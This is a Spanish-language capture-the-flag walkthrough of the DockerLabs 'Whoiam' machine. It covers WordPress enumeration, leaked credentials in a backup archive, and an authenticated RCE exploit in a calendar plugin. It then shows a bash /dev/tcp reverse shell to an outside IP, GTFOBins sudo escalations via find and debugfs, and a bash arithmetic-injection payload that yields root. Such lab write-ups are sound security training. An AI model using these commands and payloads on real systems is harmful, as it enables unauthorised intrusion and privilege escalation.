# MACHINE WHOIAM 

## INFORMACION GENERAL
- **Plataforma**: DockerLabs
- **Sistema Operativo**: Linux
- **Dificultad**: Fácil

  ![machine_dockerlabs](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/machine_dockerlabs.png)


## DESPLIEGUE 
```python
bash auto_deploy.sh psycho.tar
```

![despliegue](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/despliegue.png)

## RECONOCIMIENTO
```python
nmap -p- -sS --min-rate 5000 -vvvv -n -Pn -sCV 172.19.0.2 
```
```ruby
Nmap scan report for 172.19.0.2
Host is up, received arp-response (0.000013s latency).
Scanned at 2025-03-08 20:55:00 -05 for 11s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Whoiam
|_http-generator: WordPress 6.5.4
MAC Address: 02:42:AC:13:00:02 (Unknown)
```

Observamos el puerto `80` alojando un servicio web que lleva de título `whoiam`, podemos echar un ojo a ver con que nos encontramos
![servicio_web](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/servicio_web.png)

No encontramos nada intersante, podemos usar una extensión muy buena para averiguar las tecnologías que se ejecutan en la web
![wappalyzer](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/wappalyzer.png)

Vemos que nos reporta tecnologías interesantes como un `CMS WordPress`, el lenguaje de programacion `php`,etc

Si estamos mas acostumbrados mas a la terminal podemos usar `whatweb`
```ruby
whatweb http://172.19.0.2
```

```ruby
http://172.19.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.19.0.2], JQuery[3.7.1], MetaGenerator[WordPress 6.5.4], Script, Title[Whoiam], UncommonHeaders[link], WordPress[6.5.4]
```

Podemos observar que ambos métodos nos detectan el `CMS WordPress`, asi que vamos a enumerar un poquito 

## ENUMERACIÓN
Podemos enumerar de diferentes maneras, por ejemplo con `Gobuster` o lanzando los script de Nmap que tiene, en este caso como sabemos que hay un WordPress, se nos viene a la mente que debe haber un directorio
`wp-admin, wp-login.php`, comenzamos:

```ruby
nmap -p80 --script vuln 172.19.0.2
```
>[!] Script Vuln
>
>Realmente este script no detecta vulnerabilidades por si mismo, sino que ejecuta otros scripts NSE de la categoria Vuln en el objetivo que es la IP 

```ruby
PORT   STATE SERVICE
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-sql-injection: 
|   Possible sqli for queries:
|     http://172.19.0.2:80/wp-includes/js/jquery/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://172.19.0.2:80/wp-includes/js/jquery/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://172.19.0.2:80/wp-includes/js/jquery/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://172.19.0.2:80/wp-includes/js/jquery/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://172.19.0.2:80/wp-includes/js/jquery/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://172.19.0.2:80/wp-includes/js/jquery/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://172.19.0.2:80/wp-includes/js/jquery/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://172.19.0.2:80/wp-includes/js/jquery/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://172.19.0.2:80/wp-includes/js/jquery/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://172.19.0.2:80/wp-includes/js/jquery/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://172.19.0.2:80/wp-includes/js/jquery/?C=M%3BO%3DA%27%20OR%20sqlspider
|_    http://172.19.0.2:80/wp-includes/js/jquery/?C=S%3BO%3DD%27%20OR%20sqlspider
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=172.19.0.2
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://172.19.0.2:80/index.php/comments/feed/1quot;https:/en.gravatar.com/&quot;&gt;Gravatar&lt;/a&gt;.]]
|     Form id: wp-block-search__input-2
|_    Form action: http://172.19.0.2/
| http-wordpress-users: 
| Username found: erik
| Username found: developer
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /backups/: Backup folder w/ directory listing
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 6.5.4
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
MAC Address: 02:42:AC:13:00:02 (Unknown)
```

Efectivamente tenemos los directorios de WordPress, que nos ha enumerdo el script `http-enum`, tambien nos encontró 2 posibles usuarios esto gracias al script de `http-wordpress-users`

Si hacemos la enumeracion con Gobuster, encontramos lo mismo, tambien lo haremos PORQUE SIEMPRE ES BUENO CONOCER DIFERENTES VECTORES DE ENUMERACIÓN 

```ruby
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.19.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   502,404,500
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php,xml,csv
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/wp-content           (Status: 301) [Size: 313] [--> http://172.19.0.2/wp-content/]
/index.php            (Status: 301) [Size: 0] [--> http://172.19.0.2/]
/wp-login.php         (Status: 200) [Size: 4039]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 314] [--> http://172.19.0.2/wp-includes/]
/readme.html          (Status: 200) [Size: 7401]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 311] [--> http://172.19.0.2/wp-admin/]
/backups              (Status: 301) [Size: 310] [--> http://172.19.0.2/backups/]
/xmlrpc.php           (Status: 405) [Size: 42]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://172.19.0.2/wp-login.php?action=register]
/server-status        (Status: 403) [Size: 275]
Progress: 1245858 / 1245864 (100.00%)
===============================================================
Finished
===============================================================
```

Comprobamos y podemos confirmar que tenemos directorios semejantes, hay algunos terminos interesantes como `xmlrpc.php`, vamos a explicar un poco de que se trata como un PLUS, este no es el
caso de su explotación.
>![+]
>
>*XML-RPC*: Es un protocolo de `llamada a procedimiento remoto (RPC)` que usa `XML` para codificar los datos y http como protocolo de transmisión de mensajes
>
>*xmlrpc.php*: Archivo central de WordPress que permite la comunicación remota en el sitio web a travez del protocolo `XML-RPC`
>
>*Vulnerabilidades*: Este archivo es objetivo de común de varios ataques de hackinng ya que puede ser explotado para `Fuerza Bruta, DDoS, RCE`

Vamos a seguir buscando informacion que nos sirva para un intento de Inicio de sesion, tenemos directorios para buscar

En el directorio `Backups`, tenemos un comprimido .zip, nos lo descargamos para poder ver que contiene
```ruby
wget http://172.19.0.2/backups/databaseback2may.zip
```
![developer_password](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/developer_password.png) 

Nos encontramos con las credenciales del usuario `developer`, entonces vamos a iniciar sesión para ver si podemos explotar algo
![inicio_de_sesion](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/inicio_de_sesion.png)

Vamos a enumerar de mejor manera con `wpscan`, averiguando plugins, extensiones vulnerables

```ruby
wpscan --url http://172.19.0.2 -e ap,vt
```
![enumeracion_plugin](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/enumeracion_plugin.png)

## EXPLOTACIÓN

Como podemos observar tenemos un plugin desactualizado, podemos hacer una busqueda de exploits

```ruby
searchsploit "modern events calendar lite"
```
![searchsploit](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/searchsploit.png)

Usaremos `Remote Code Execution (Authenticated)`, porque tenemos tenemos credenciales de autenticación  

```ruby
searchsploit -m php/webapps/50082.py
```
OJO: he cambiado el nombre del exploit por: `plug_calendar.py`
![analisis_script](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/analisis_script.png)

Si analizamos un poco el script tenemos que pasarle parámetros como Ip, Puerto, Wp-Path, Usuario, Password, lo ejecutamos de la siguiente manera:

```ruby
python plug_calendar.py -T 172.18.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
```

![shell_upload](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/shell_upload.png)

Como vemos, el exploit logró autenticarse de manera exitosa juntamente con la carga de shell, nos dirigimos al enlace que nos proporciona
![shell](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/shell.png)


Tenemos una web shell, pero para tener una mas interactiva, podemos enviarnos una reverse shell hacia nuestro equipo:
En la webshell hacemos:
```ruby
bash -c 'bash -i >& /dev/tcp/192.168.59.128/1234 0>&1'
```
y en nuestra maquina nos ponemos en escucha:
```ruby
nc -nlvp 1234
```
![reverse_shell](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/reverse_shell.png)

TRATAMIENTO DE LA TTY
```ruby
script /dev/null -c bash
ctrl + z
stty raw -echo:fg
        reset xterm
export TERM=xterm
export SHELL=bash
```
## ESCALADA DE PRIVILEGIOS 
Realizamos un `sudo -l` podemos ver que el usuario `rafa` puede ejecutar el binario `find`, podemos aprovecharnos de eso y convertinos en dicho usuario, usamos [GTFObins](https://gtfobins.github.io/) 
![escalada_rafa](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/escalada_rafa.png)

```ruby
sudo -u rafa find . -exec /bin/sh \; -quit
```
Con eso conseguiremos ser el usuario rafa, seguimos escalando privilegios y podemos ver que el usuario `ruben` puede ejecutar el binario de sistema que es `debugfs`
entonces como dice [GTFObins](https://gtfobins.github.io/gtfobins/debugfs/#sudo) hacemos
```ruby
sudo -u ruben debugfs
!/bin/bash
```
![ruben](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/ruben.png)


Somos el usuario `ruben` ahora podemos seguir escalando y vemos que todos pueden ejecutar un script de nombre `penguin.sh`, podemos ver que contiene el archivo

![penguin_sh](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/penguin_sh.png)

Este script tiene como funcion comparar un numero que se ingresa por input y verifica si es correcto con el número 42, si este es igual devuelve un `correcto` como respuesta, caso contrario devuelve `incorrecto`
Averiguando nos estamos enfrentando a un `bash -eq privilege escalation`, ingresaremos el siguiente fragmeto de código como input:

```ruby
a[$(/bin/sh >&2)]+42
```
![root](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/whoiam/root.png)

HEMOS RESUELTO LA MAQUINA!

## ELIMINAR LA MAQUINA

```ruby
ctrl + c 
```






